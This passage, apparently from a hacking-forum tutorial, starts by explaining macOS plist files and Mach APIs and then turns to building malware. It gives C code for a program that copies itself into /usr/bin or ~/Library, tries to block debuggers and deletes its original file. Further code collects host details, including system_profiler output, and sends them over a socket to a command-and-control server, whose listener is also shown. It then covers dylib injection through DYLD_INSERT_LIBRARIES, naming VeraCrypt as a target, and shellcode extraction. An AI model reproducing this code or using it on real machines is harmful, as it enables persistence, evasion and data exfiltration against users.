<p>Now, let’s talk about Property List (plist) files. file format used on macOS to store structured data, such as configuration settings, preferences, and metadata. They have a hierarchical structure with key-value pairs and support various data types. Property list files can be in XML or binary format.</p>
<p>In the context of macOS, property list files are commonly used for storing application metadata, entitlements, sandboxing settings, and code signing details. For example:</p>
<ul>
<li><em>Entitlements:</em> Property list files, like the Info.plist, can contain entitlements that grant permissions to applications, specifying their access to system resources.</li>
<li><em>Sandbox:</em> Property list files define sandbox settings that restrict an application’s access to resources, enhancing security and protecting user privacy.</li>
<li><em>Code Signing:</em> Property list files store information related to code signing, verifying the authenticity and integrity of an application.</li>
</ul>
<p>Property List (plist) files can hold various data types and have a hierarchical structure. Here are some commonly used data types and an example of the plist file structure:</p>
<ol>
<li>Data Types:
<ul>
<li>String: A sequence of characters.</li>
<li>Number: Represents numeric values, including integers and floating-point numbers.</li>
<li>Boolean: Represents true or false values.</li>
<li>Date: Represents a specific date and time.</li>
<li>Array: An ordered collection of values.</li>
<li>Dictionary: A collection of key-value pairs, where each key is unique.</li>
</ul>
</li>
</ol>
<p>Here’s an example of a plist file structure:</p>
<pre><code class="lang-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;plist version="1.0"&gt;
  &lt;dict&gt;
    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.files.user-selected.read-only&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.network.client&lt;/key&gt;
    &lt;true/&gt;
  &lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>In this example, the property list file contains a dictionary with several entitlement keys related to sandboxing. Each key represents a specific entitlement, and the value <code>&lt;true/&gt;</code> indicates that the corresponding entitlement is enabled.</p>
<p>The three entitlements mentioned in this example are:</p>
<ul>
<li><code>com.apple.security.app-sandbox</code>: Enables sandboxing for the application.</li>
<li><code>com.apple.security.files.user-selected.read-only</code>: Allows read-only access to user-selected files.</li>
<li><code>com.apple.security.network.client</code>: Grants the application permission to act as a network client.</li>
</ul>
<p>This simplified example demonstrates how property list files can store entitlements related to sandboxing, providing a structured format for specifying the application’s access and permissions within the sandbox environment.</p>
<ul>
<li>We can use otool to read Info.plist in different formats:</li>
</ul>
<pre><code class="lang-bash">plutil -convert xml1 /Applications/Safari.app/Contents/Info.plist -o - 
plutil -convert json /Applications/Safari.app/Contents/Info.plist -o - 
</code></pre>
<p>Overall, property list files play a crucial role in macOS by providing a structured and standardized format to store important information related to entitlements, sandboxing, code signing, and more. They enable applications and system components to access and manage this data efficiently, contributing to the security and integrity of the macOS ecosystem.</p>
<p>That’s all we need to know for now. There’s more to explore, such as Gatekeeper, Sandboxing, App Bundles, and so on, but these are the most important security mechanisms that matter to us for development. Now let’s delve a bit deeper and discuss internal architecture. Why focus on internals? Well, even though I’m not planning to develop a rootkit or anything as advanced, it’s crucial to understand the OS as thoroughly as possible from a developer’s perspective. After all, we’re writing software.</p>
<h1><a name="mach-apis-6" class="anchor" href="https://0x00sec.org#mach-apis-6"></a>Mach API’s</h1>
<p>Let’s take a quick look at Mach. Initially designed as a communication-centric operating system kernel with robust multiprocessing support, Mach aimed to lay the groundwork for various operating systems. It favored a microkernel architecture, aiming to keep essential OS services like file systems, I/O, memory management, networking, and different OS personalities separate from the kernel.</p>
<p>XNU, whimsically named “X is not UNIX,” serves as the kernel for Mac OS X. Positioned at the core, Darwin and the rest of the OS X software stack rely on the XNU kernel.</p>
<p>XNU stands out as a hybrid operating system, blending a hardware/Io tasking interface from the minimalist Mach microkernel with elements from FreeBSD kernel and its POSIX-compliant API. Understanding how programs map to processes in virtual memory on OS X can be a bit tricky due to overlapping definitions. For example, the term “thread” could refer to either the POSIX API pthreads from BSD or the fundamental unit of execution within a Mach task. Moreover, there are two distinct sets of syscalls, each mapped to positive (Mach) or negative (BSD) numbers.</p>
<p>Mach provides a virtual machine interface, abstracting system hardware—a common feature in many operating systems. Its core kernel is designed to be simple and extensible, boasting an Inter-Process Communication (IPC) mechanism that underpins many kernel services. Notably, Mach seamlessly integrates IPC capabilities with its virtual memory subsystem, leading to optimizations and simplifications across the OS.</p>
<p>On OS X, we deal with “tasks” rather than processes. Tasks, similar to processes, serve as OS-level abstractions containing all the resources needed to execute a program. Technically, Mach refers to its processes as tasks, although the concept of a BSD-style process that encapsulates a Mach task persists. Resources within a task include:</p>
<ul>
<li>A virtual address space</li>
<li>Inter-process communication (IPC) port rights</li>
<li>One or more threads</li>
</ul>
<p>“Ports” serve as an inter-task communication mechanism, using structured messages to transmit information between tasks. Operating solely in kernel space, ports act like P.O. Boxes, albeit with restrictions on message senders. Ports are identified by Task-specific 32-bit numbers.</p>
<p>Threads are units of execution scheduled by the kernel. OS X supports two thread types (Mach and pthread), depending on whether the code originates from user or kernel mode. Mach threads reside at the OS’s lowest level in kernel-mode, while pthreads from the BSD realm execute programs in user-mode. (More in this, later)</p>
<p>Mach redefines the traditional Unix notion of a process into two components: a task and a thread. In the kernel, a BSD process aligns with a Mach task. A task serves as a framework for executing threads, encapsulating resources and defining a program’s protection boundary. Mach ports, versatile abstractions, facilitate IPC mechanisms and resource operations.</p>
<p>IPC messages in Mach are exchanged between threads for communication, carrying actual data or pointers to out-of-line data. Message transfer is asynchronous, with port capabilities exchanged through messages.</p>
<p>Mach’s virtual memory system encompasses machine-independent components like address maps and memory objects, alongside machine-dependent elements like the physical map. Memory objects serve as containers for data mapped into a task’s address space, managed by various pagers handling distinct memory types. Exception ports, assigned to each task and thread, facilitate exception handling, allowing multiple handlers to suspend affected threads, process exceptions, and resume or terminate threads accordingly.</p>
<p>Let’s explore the basics of Mach System Calls, including retrieving system information and performing code injection. This will provide a fundamental understanding of interacting with macOS, By the way, a system call is a function of the kernel invoked by a user space. It can involve tasks like writing to a file descriptor or exiting a program. Typically, these system calls are wrapped by C functions in the standard library.</p>
<h2><a name="baby-steps-7" class="anchor" href="https://0x00sec.org#baby-steps-7"></a>Baby Steps</h2>
<p>If we head over to the <a href="https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/" rel="noopener nofollow ugc">Mach IPC Interface</a> or <a href="https://developer.apple.com/documentation/kernel/" rel="noopener nofollow ugc">Apple documentation</a>  we can find a Mach system call that’s pretty handy for getting basic info about the host system. It tells us stuff like how many CPUs there are, both maximum and available, the physical and logical CPUs, memory size, and the max memory size. This call is <code>host_info()</code>, and it’s super useful for getting details about a host, like what kind of processors are installed, how many are currently available, and the total memory size.</p>
<p>Now, like a lot of Mach “info” calls, <code>host_info()</code> needs a flavor argument to specify what kind of info you want. For instance:</p>
<pre><code class="lang-c">kern_return_t host_info(host_t host, host_flavor_t flavor,
                        host_info_t host_info,
                        mach_msg_type_number_t host_info_count);
</code></pre>
<ul>
<li><code>HOST_BASIC_INFO</code>: Returns basic system information.</li>
<li><code>HOST_SCHED_INFO</code>: Provides scheduler-related data.</li>
<li><code>HOST_PRIORITY_INFO</code>: Offers scheduler-priority-related information.</li>
</ul>
<p>Besides <code>host_info()</code>, other calls like <code>host_kernel_version()</code>, <code>host_get_boot_info()</code>, and <code>host_page_size()</code> can be employed to access miscellaneous system details.</p>
<pre><code class="lang-c">int main() {
    kern_return_t kr; /* the standard return type for Mach calls */
    mach_port_t myhost;
    char kversion[256]; 
    host_basic_info_data_t hinfo;
    mach_msg_type_number_t count;
    vm_size_t page_size;
  

    // Retrieve System Information
    printf("Retrieving System Information...\n");

    // Get send rights to the name port for the current host
    myhost = mach_host_self();

    // Get kernel version
    kr = host_kernel_version(myhost, kversion);
    EXIT_ON_MACH_ERROR("host_kernel_version", kr);

    // Get basic host information
    count = HOST_BASIC_INFO_COUNT; // size of the buffer
    kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&amp;hinfo, &amp;count);
    EXIT_ON_MACH_ERROR("host_info", kr);

    // Get page size
    kr = host_page_size(myhost, &amp;page_size);
    EXIT_ON_MACH_ERROR("host_page_size", kr);

    printf("Kernel Version: %s\n", kversion);
    printf("Maximum CPUs: %d\n", hinfo.max_cpus);
    printf("Available CPUs: %d\n", hinfo.avail_cpus);
    printf("Physical CPUs: %d\n", hinfo.physical_cpu);
    printf("Maximum Physical CPUs: %d\n", hinfo.max_cpus);
    printf("Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Maximum Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Memory Size: %llu MB\n", (unsigned long long)(hinfo.memory_size &gt;&gt; 20));
    printf("Maximum Memory: %llu MB\n", (unsigned long long)(hinfo.max_mem &gt;&gt; 20));
    printf("Page Size: %u bytes\n", (unsigned int)page_size);

    // Clean up and exit
    mach_port_deallocate(mach_task_self(), myhost);
    exit(0);
}
</code></pre>
<p>So, basically, the code is pretty easy to understand. It just grabs system information and shows things like the Kernel version, right? It’s simple and harmless. But if we want to learn more about system calls, we need something different. How about something that acts more like malware?  But let’s keep it simple at first. We can start by writing a code that write a copy of itself to either <code>/usr/bin/</code> or <code>/Library/</code>.</p>
<p>To achieve this kind of behavior, we need to use task operations because we need to control another process and access system processes. I found specific Mach system calls like <code>pid_for_task()</code>, <code>task_for_pid()</code>, <code>task_name_for_pid()</code>, and <code>mach_task_self()</code>, which allow conversion between Mach task ports and Unix PIDs. However, they essentially bypass the capability model, which means they are restricted on macOS due to UID checks, entitlements, SIP, etc., limiting their use, and are not documented as part of a public API and are privileged, typically accessible only by processes with elevated privileges like root or members of the <code>procview group</code>. This limitation poses a challenge because malware would need elevated privileges or execution on a privileged account to work unless obtained through various means.</p>
<p>Thus, we can’t use <code>task_for_pid</code> on Apple platform binaries due to SIP. However, if permitted, we would have the port and could essentially do anything we want including what I’m about to explain. Therefore, So for this example we’ll use <code>mach_task_self()</code> as it typically does not require privileges. It retrieves information about the current task, depending on the security policies enforced.</p>
<pre><code class="lang-c">void hide_process() {
    mach_port_t task_self = mach_task_self();
    kern_return_t kr;

    // Set exception ports to disable debuggers.
    kr = task_set_exception_ports(task_self, EXC_MASK_ALL, MACH_PORT_NULL, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, THREAD_STATE_NONE);
    if (kr != KERN_SUCCESS) {
        printf("Uh-oh: Failed to set exception ports: %s\n", mach_error_string(kr));
        exit(EXIT_FAILURE);
    }

    printf("Shhh... Process is now hidden\n");
}
</code></pre>
<p>the function obtains the task port for the current process using <code>mach_task_self()</code>, which essentially retrieves a send right to a task port. In the Mach kernel, a task port represents a task, and sending a message to this port enables actions to be performed on the corresponding task.</p>
<p>Next, to set the exception ports to disable debuggers and other forms of external monitoring. This is achieved through the <code>task_set_exception_ports()</code> function call. and any received messages should be directed to a null Mach port. The process then exits with a failure status.</p>
<pre><code class="lang-c">void copy_file(const char *source_path, const char *dest_path) {
    FILE *source_file = fopen(source_path, "rb");
    if (source_file == NULL) {
        printf("Oops: Failed to open source file for copying: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    FILE *dest_file = fopen(dest_path, "wb");
    if (dest_file == NULL) {
        printf("Oops: Failed to open destination file for copying: %s\n", strerror(errno));
        fclose(source_file); 
        exit(EXIT_FAILURE);
    }

    char buffer[BUF_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), source_file)) &gt; 0) {
        fwrite(buffer, 1, bytes_read, dest_file);
    }

    fclose(source_file);
    fclose(dest_file);

    // Grant execute permission for the copied binary
    if (chmod(dest_path, PERMISSIONS) == -1) {
        printf("Oops: Failed to set execute permission for %s\n", dest_path);
        exit(EXIT_FAILURE);
    }

    printf("Hey! copied from %s to %s\n", source_path, dest_path);
}
</code></pre>
<p>The function reads data from the source file in chunks and writes it to the destination file until the entire file is copied. After copying, it sets execute permission for the copied binary using <code>chmod()</code> to make it executable.</p>
<pre><code class="lang-c">// Main function
int main(int argc, char *argv[]) {
    // Determine home directory
    const char *home_dir;
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        printf("Oops: Failed to get home directory\n");
        exit(EXIT_FAILURE);
    }
    home_dir = pw-&gt;pw_dir;

    // Construct malware path
    char home_malware_path[PATH_MAX_LENGTH];
    snprintf(home_malware_path, sizeof(home_malware_path), "%s/Library/%s", home_dir, MALWARE_NAME);

    // Check if we have root privileges
    if (geteuid() == 0) {
        // Attempt to copy malware to system directory
        const char *system_malware_path = "/usr/bin/" MALWARE_NAME;
        if (access(system_malware_path, F_OK) != 0) {
            copy_file(argv[0], system_malware_path);
            execute_malware(system_malware_path);
        }
    } else {
        // Attempt to copy malware to user's home directory
        if (access(home_malware_path, F_OK) != 0) {
            copy_file(argv[0], home_malware_path);
            greet_user();
        }
    }

    // Hide the process
    hide_process();

    // Vanish, Damn
    remove(argv[0]);

    return EXIT_SUCCESS;
}
</code></pre>
<p>So the logic is as follows: It first checks if it has root privileges by calling geteuid(). If it does, it attempts to copy itself to /usr/bin/, and if successful, it executes the copied binary. If it doesn’t have root privileges, it attempts to copy itself to ~/Library/ (the user’s home directory). If successful, it prints “Hello, World!”. After copying itself it calls hide_process() to attempt to hide the process from detection. Finally, it removes the original binary file to erase traces of its presence.</p>
<p>This demonstrates a basic technique used by malware to hide itself on a system by copying itself to a system directory (/usr/bin/) or the user’s home directory (~/Library/) and then attempting to hide its process from detection.</p>
<p>This is far from being a malicious code, but it does provide us with valuable insights into working with the Mach API and conducting low-level system operations. Through this example, we’ve gained familiarity with essential concepts such as process management and communication.</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">0x100003e79 &lt;+505&gt;: callq  0x100003c50               ; hide_process
0x100003e7e &lt;+510&gt;: movq   0x17b(%rip), %rax         ; (void *)0x0000000000000000
0x100003e85 &lt;+517&gt;: movl   (%rax), %edi
0x100003e87 &lt;+519&gt;: movl   -0x18(%rbp), %esi
0x100003e8a &lt;+522&gt;: callq  0x100003ec6               ; symbol stub for: mach_port_deallocate
0x100003e8f &lt;+527&gt;: xorl   %edi, %edi
0x100003e91 &lt;+529&gt;: movl   %eax, -0x21ec(%rbp)
0x100003e97 &lt;+535&gt;: callq  0x100003eb4               ; symbol stub for: exit
</code></pre>
<p>Here we put a our little program into a debugger, and as you can see specially in the disassembly part there’s instructions correspond to our operation like <code>/usr/bin/</code> also you can notice the cleanup operations are performed, such as deallocating  port and exiting the program.</p>
<h2><a name="the-naive-way-8" class="anchor" href="https://0x00sec.org#the-naive-way-8"></a>The Naive Way</h2>
<p>After infecting a new host, let’s ensure our malware notifies us of its presence by sending information about the host. Although this method might seem amateurish - a malware shouldn’t connect to a Command &amp; Control server (C2) initially - since we’re just exploring macOS as a new territory, it’s a starting point. We collect system information such as the system name, release version, machine architecture, hardware model, user ID, home directory, etc., and then send this information to the C2. For retrieving or modifying information about the system and environment, we can make use of <a href="https://developer.apple.com/documentation/kernel/1387446-sysctlbyname" rel="noopener nofollow ugc">Developer Apple - sysctlbyname</a>. This function enables us to retrieve specific system information, such as the cache line size, directly from the system kernel.</p>
<p>However, when it comes to System Owner/User Discovery, we typically access user-related data through standard POSIX interfaces like <code>getpwuid()</code>, relying on these interfaces as discussed before. To fetch the hardware model, we would replace <code>"hw.cachelinesize"</code> with <code>"hw.model"</code> in the <code>sysctlbyname</code> function call.</p>
<p>Next, we want to gather more information about the host, not just its hardware model. Now, you may wonder why we don’t just use the first example you introduced. Well, it’s simple. This is to showcase how we access user-related data through standard POSIX interfaces. However, if you want to introduce the hardware model in the above example, just</p>
<pre><code class="lang-c">count = sizeof(model); kr = sysctlbyname("hw.model", model, &amp;count, NULL, 0); EXIT_ON_MACH_ERROR("sysctl hw.model", 1);
</code></pre>
<p>we also wanna send some information like kernel version, for possible known vulnerabilities, to escalate, So here’s an example, we use the same function as to get hardware model</p>
<pre><code class="lang-c">size_t len = BUF_SIZE;
if (sysctlbyname("kern.version", &amp;kernel_version, &amp;len, NULL, 0) == 0) {
	send_data(sockfd, "\nKernel Version: ");
	send_data(sockfd, kernel_version);
</code></pre>
<p>Now let’s dump and send more information about the profile of the infected host, including details such as System Name,  Architecture, Login shell,  Home directory and any other relevant data that could aid in further exploiting or maintaining access to the compromised system, W’ll use function such as <code>uname</code>, <code>getpwuid</code>, and <code>getgrgid</code>,  Let’s take a look at the code,</p>
<pre><code class="lang-c">void system_info(int sockfd) {
  struct utsname sys_info;
  char kernel_version[BUF_SIZE];

  // Get system information
  if (uname( &amp; sys_info) != 0) {
    send_error("Failed to get system information");
    return;
  }

  send_data(sockfd, "\nSystem Name: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nRelease Version: ");
  send_data(sockfd, sys_info.release);
  send_data(sockfd, "\nMachine Architecture: ");
  send_data(sockfd, sys_info.machine);
  send_data(sockfd, "\nOperating System: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nVersion: ");
  send_data(sockfd, sys_info.version);
</code></pre>
<p>So, the function is pretty self-explanatory; it simply provides a snapshot of the system and user environment, which is crucial for gathering information on potential targets. However, since malware typically only has one chance for infection, it needs to be self-reliant before attempting to Phone Home. This is why the approach of using a dummy malware, primarily for testing and exploring options before developing an actual malware, is essential.</p>
<p>Nevertheless, deploying a dummy malware still provides attackers with a significant amount of information that could be leveraged for subsequent targeted attacks or exploiting vulnerabilities, whether in the kernel or user land. The malware could be multi-staged to ensure stealth and a low profile. This code can act as stage 1 of an attack, proliferating itself in the system, waiting to activate stage 2, and so on. These types of attacks are advanced and hard to detect, especially in environments like macOS, where malware can remain undetected for years.</p>
<p>Another type of information gathering employed by macOS malware, as seen in some reports, involves ‘LOLBins’ (Living off the Land Binaries). You can program the malware to simply execute <code>/usr/sbin/system_profiler -nospawn -detailLevel full</code>,  For example.</p>
<pre><code class="lang-c">void system_profiler(int sockfd) {
  FILE * fp;
  char buffer[BUF_SIZE];

  // Execute
  fp = popen("/usr/sbin/system_profiler -nospawn -detailLevel full", "r");
  if (fp == NULL) {
    send_error("Failed");
    return;
  }

  // Read command output and send over to C2 
  while (fgets(buffer, BUF_SIZE, fp) != NULL) {
    send_data(sockfd, buffer);
  }

  pclose(fp);
}
</code></pre>
<p>This command alone saves the trouble and provides all the information about a host that an attacker can gather. However, the catch is that such commands are visible and can be easily flagged. Despite this, it remains an easy and effective method for malware to extract details from the infected host.</p>
<p>Alright, so how do we transmit the data? We use <code>socket</code>. This API allows us to send data to the connected endpoint, which in this case is the Command &amp; Control server. Data is sent in the form of strings. To ensure that the data is properly formatted and transmitted over the socket to the C2 server, we rely on functions like <code>send()</code> for sending data, and file I/O functions such as <code>popen()</code> and <code>fgets()</code> for reliable reading and sending of data. It’s pretty simple.</p>
<p>The C2 server is also straightforward, designed solely for handling incoming connections. It won’t have any protection mechanisms to hide itself from the system where it’s running, but this server is basic for demonstration purposes only. I recommend implementing encryption, setting up a database to organize data, and generating a temporary ID to associate with each instance.</p>
<p>The extraction module (ext) starts an autonomous thread listening for incoming connections from malware instances. Once connected, the module simply prints the content of the incoming connection (which is the information extracted by the client) to the standard output.</p>
<pre><code class="lang-c">// The server will keep listening for incoming connections indefinitely
while (1) {
    // Accept a new connection from a client
    cltlen = sizeof(cltaddr);
    cltfd = accept(dexft_fd, (struct sockaddr *) &amp;cltaddr, &amp;cltlen);

    // Check if the accept call was successful
    if (cltfd &lt; 0) {
        // If accept failed, print an error message and continue listening
        printf("Failed to accept incoming connection, %d\n", cltfd);
        continue;
    }

    // Print out information about the connected client
    printf("Collecting data from client %s:%d...\n", inet_ntoa(cltaddr.sin_addr), ntohs(cltaddr.sin_port));

    // Receive data from the client and process it
    while ((br = recv(cltfd, buf, BUF_SIZE, 0)) &gt; 0) {
        // Write the received data to the standard output
        fwrite(buf, 1, br, stdout);
    }

    // Check if an error occurred during data reception
    if (br &lt; 0) {
        printf("ERROR: Failed to receive data from client!\n");
    }

    // Close the client socket
    close(cltfd);
}

return NULL;

</code></pre>
<p>As you can see, the code itself is quite simple yet functional. Once the client is executed, the server collects data from the connected clients, and then closes the connection before resuming listening for new connections,</p>
<pre><code class="lang-sh">Collecting data from client ...

System Name: Darwin
Release Version: 19.6.0
Machine Architecture: x86_64
Operating System: Darwin
</code></pre>
<p>Obviously, this will get flagged within seconds if there’s a security mechanism in place. Why, you may ask? Well, the behavior exhibited here screams malware—from establishing a connection to sending system information and continuously receiving and executing commands from a remote server. The network traffic pattern alone is a red flag. Plus, the transmission of system information immediately after connection establishment… But the good news is that most Mac users assume they’re safe by default, so they don’t entertain the idea that capable malware could go unnoticed.</p>
<p>So, if this were a targeted attack, something with a bit of obfuscation, perhaps polymorphic and advanced covert channels for communication in place, would get the job done. However, this explanation provides a simple overview of how dummy malware can be used as a learning piece of code before developing actual malware. Next, we’ll delve into a topic that I find quite interesting. Yes, you guessed it;</p>
<h1><a name="code-injection-9" class="anchor" href="https://0x00sec.org#code-injection-9"></a>Code Injection</h1>
<p>Actually, exploring Code Injection deserves its own article, and I’ll include some resources at the end. However, for now, let’s focus on two techniques that I find quite effective.  So, Let’s begin by introducing the first technique, which involves leveraging environment variables or DYLD_INSERT_LIBRARIES for code injection.</p>
<p>DYLD_INSERT_LIBRARIES is actually a powerful feature that allows users to preload dynamic libraries into applications, Both developers and attackers can inject code into running processes without modifying the original executable file is commonly used to intercept function calls, manipulate program behavior, or even introduce malicious functionality into legitimate application, As we gone see, It’s basically a colon separated list of dynamic libraries to load before the ones specified in the program. This lets you test new modules of existing dynamic shared libraries that are used in flat-namespace images by loading a temporary dynamic shared library with just the new modules.</p>
<p>In simple term’s, it will load any dylibs you specify in this variable before the program loads, essentially injecting a dylib into the application, So for example</p>
<pre><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
__attribute__((constructor))

void foo() {
  printf("Dynamic library injected! \n");
  system("/bin/bash -c 'echo Library injected!'");
}
</code></pre>
<p>As you can see we have a function <code>foo()</code> that prints to let us know that we successful injected a library and a system command that execute a shell to echo basically the same thing and that <code>attribute((constructor))</code> marks the function run before the application’s main function, into which we injected the <code>dylib</code>, piece of cake right, But how do we know identify binaries vulnerable to environment variable injection, on that later, but first let’s just try it on one of our previous program, So just compile that code like any other program and run it.</p>
<pre><code class="lang-sh">~ &gt; gcc -dynamiclib inject.c -o inject.dylib

~ &gt; DYLD_INSERT_LIBRARIES=inject.dylib ./foo
Dynamic library injected!
Library injected!
</code></pre>
<p>et voilà, When affected, what happens is that it loads any dylibs specified in this variable before the program loads, essentially injecting a dylib into the application. This could potentially lead to privilege escalation, right? Not so fast on the Apple platform binaries. As of macOS 10.14, third-party developers can opt in to a <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements" rel="noopener nofollow ugc">hardened runtime</a> for their application, which can prevent the injection of dylibs using this technique.</p>
<p>So, basically, we can still perform injection when the application is not defined as having a “Hardened Runtime” and therefore allows the injection of dylibs using the environment variable. Alternatively, when the binary is using a hardened runtime and the developer released it with the appropriate entitlements, let’s go over this one more time:</p>
<ul>
<li>The “Disable-library-validation” entitlement allows any dylib to run on the binary even without checking who signed the file and the library. This permission usually exists in programs that allow community-written plugins.</li>
<li>The <code>com.apple.security.cs.allow-dyld-environment-variables</code> entitlement loosens the hardened runtime restrictions and allows the use of <code>DYLD_INSERT_LIBRARIES</code> to inject a library.</li>
</ul>
<p>Alright on possible target application, For example to run this on Safari.app It won’t work, because is hardened and lacks the matching entitlement,</p>
<p><img src="https://0xf00sec.github.io/images/IMG3.png" width="690" height="190"> </p>
<p>But that doesn’t necessarily imply that the application is not hardened, as there are other Hardened Runtime features that may not be reflected in the entitlements. So, to expedite the process, I found that Veracrypt is not using Hardened Runtime. Therefore, I’m going to use it as an example for the entire article. Sorry :), Now, let’s attempt to inject it, but first…</p>
<pre><code class="lang-c">__attribute__((constructor))

static void customConstructor(int argc, const char **argv)
{
printf("Foo!\n");
syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
}
</code></pre>
<p>So, we simply print ‘foo’ and log a message using the <code>syslog()</code> function, which logs an error message indicating successful injection of a dynamic library (dylib) along with the name of the program. Let’s try it. If we see the following output, it seems that we’ve successfully loaded the library:</p>
<p><img src="https://0xf00sec.github.io/images/IMG4.png" width="690" height="285"> </p>
<p>If we attempt to use <code>DYLD_INSERT_LIBRARIES</code> in another binary that is hardened and lacks the matching entitlement, we won’t be able to load the library, and consequently, we won’t see the desired output.</p>
<p>However, some internal components of macOS expect threads to be created using the BSD APIs and have all Mach thread structures and <code>pthread</code> structures set up properly. This can present challenges, especially with changes introduced in macOS 10.14.</p>
<p>To address this issue, I came across a piece of code called <a href="https://newosxbook.com/src.jl?tree=listings&amp;file=inject.c" rel="noopener nofollow ugc">inject.c</a>. Additionally, I highly recommend reading the “Mac Hacker’s Handbook” as it provides invaluable insights and includes great examples of interprocess code injection.</p>
<p>From my understanding, the transition from Mach thread APIs to pthread APIs in macOS, particularly concerning the initialization of thread structures, presents challenges. However, the discovery of the <code>_pthread_create_from_mach_thread</code> function provides a viable alternative for initializing pthread structures from bare Mach threads. This ensures compatibility and proper functioning of threaded applications across different macOS versions.</p>
<p>For those interested, I’ve included examples demonstrating how to inject code to call <code>dlopen</code> and load a dylib into a remote mach task: <a href="https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a" rel="noopener nofollow ugc">Gist 1</a> &amp; <a href="https://gist.github.com/vocaeq/fbac63d5d36bc6e1d6d99df9c92f75dc" rel="noopener nofollow ugc">Gist 2</a>"</p>
<p>Alright, let’s discuss the second technique. It’s similar to methods used on Windows, and one common approach is process injection, which is the ability for one process to execute code in a different process. In Windows, this is often utilized to evade detection by antivirus software, for example, through a technique known as DLL hijacking. This allows malicious code to masquerade as part of a different executable. In macOS, this technique can have significantly more impact due to the differences in permissions between applications.</p>
<p>In the classic Unix security model, each process runs as a specific user. Each file has an owner, group, and flags that determine which users are allowed to read, write, or execute that file. Two processes running as the same user have the same permissions; it is assumed there is no security boundary between them. Users are considered security boundaries; processes are not. If two processes are running as the same user, then one process could attach to the other as a debugger, allowing it to read or write the memory and registers of that other process. The root user is an exception, as it has access to all files and processes. Thus, root can always access all data on the computer, whether on disk or in RAM.</p>
<p>This was essentially the same security model as macOS until the introduction of …  yep, SIP (System Integrity Protection)</p>
<h2><a name="os-x-shellcode-injection-10" class="anchor" href="https://0x00sec.org#os-x-shellcode-injection-10"></a>OS X Shellcode Injection</h2>
<p>Alright, so we’re going to write a simple shellcode injection program where the malware’s host process injects shellcode into the memory of a remote process. But before we proceed, let’s write a simple shellcode for testing purposes.</p>
<p>Writing 64-bit assembly on macOS differs somewhat from ELF. Here, you just need to understand the macOS executable file format, known as Mach-O. However, for simplicity, we’ll stick with the x86_64 architecture and we can later use a linker for Mach-O executables.</p>
<p>A simple “Hello World” program starts by declaring two sections: <code>.data</code> and <code>.text</code>. The <code>.data</code> section is used for storing initialized data, while the <code>.text</code> section contains executable code. Then we define the <code>_main</code> function as the entry point of the program, followed by a reference point in the code, which we’ll call <code>trick</code>. The <code>trick</code> section will be followed by a <code>call</code> instruction that invokes the <code>continue</code> subroutine and pops the address of the string ‘Hello World!’. Also, if you notice in the code, we have a system call at the end that exits our program. The first syscall is for writing data.</p>
<pre><code class="lang-c">section .data
section .text

global _main
	_main:

start:
	jmp trick

continue:
	pop rsi            ; Pop string address into rsi
	mov rax, 0x2000004 ; System call write = 4
	mov rdi, 1         ; Write to standard out = 1
	mov rdx, 14        ; The size to write
	syscall            ; Invoke the kernel
	mov rax, 0x2000001 ; System call number for exit = 1
	mov rdi, 0         ; Exit success = 0
	syscall            ; Invoke the kernel
	
trick:
	call continue
	db "Hello World!", 0, 0
</code></pre>
<p>Alright, it’s time to compile. I typically use NASM for assembling my code. Remember what I mentioned about using the linker to create Mach-O executables? Well, after assembling the code with NASM, we’ll need to link it using <code>ld</code>. This linker not only brings together the assembled code but also incorporates necessary system libraries.</p>
<pre><code class="lang-sh">~ &gt; ./nasm -f macho64 Hello.asm -o hello.o &amp;&amp; ld ./Hello.o -o Hello -lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path`

~ &gt; ./Hello
Hello World!
</code></pre>
<p>Pretty sophisticated, right? Now, to actually turn it into machine code that we can use for injection, it needs to be converted into a hexadecimal representation. This representation consists of a small series of bytes that represent executable machine-language code. It essentially represents the exact sequence of instructions that the processor will execute. For this, we can utilize <code>objdump</code>.</p>
<pre><code class="lang-sh">~ &gt; objdump -d ./Hello | grep '[0-9a-f]:'| grep -v 'file'| cut -f2 -d:| cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '| sed 's/ $//g'| sed 's/ /\\x/g'| paste -d '' -s | sed 's/^/"/'| sed 's/$/"/g'

`\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a`
</code></pre>
<p>If, for some reason, you can’t extract the <code>shellcode</code> solely relying on <code>objdump</code>, you can always script kiddy a simple py, to parse the assembly output;</p>
<pre><code class="lang-python">def extract_shellcode(objdump_output):
    shellcode = ""
    length = 0
    lines = objdump_output.split('\n')
    
    for line in lines:
        if re.match("^[ ]*[0-9a-f]*:.*$", line):
            line = line.split(":")[1].lstrip()
            x = line.split("\t")
            opcode = re.findall("[0-9a-f][0-9a-f]", x[0])
            for i in opcode:
                shellcode += "\\x" + i
                length += 1

    return shellcode, length

def main():
    objdump_output = sys.stdin.read()
    shellcode, length = extract_shellcode(objdump_output)
    
    if shellcode == "":
        print("Bad")
    else:
        print("\n" + shellcode)

if __name__ == "__main__":
    main()
</code></pre>
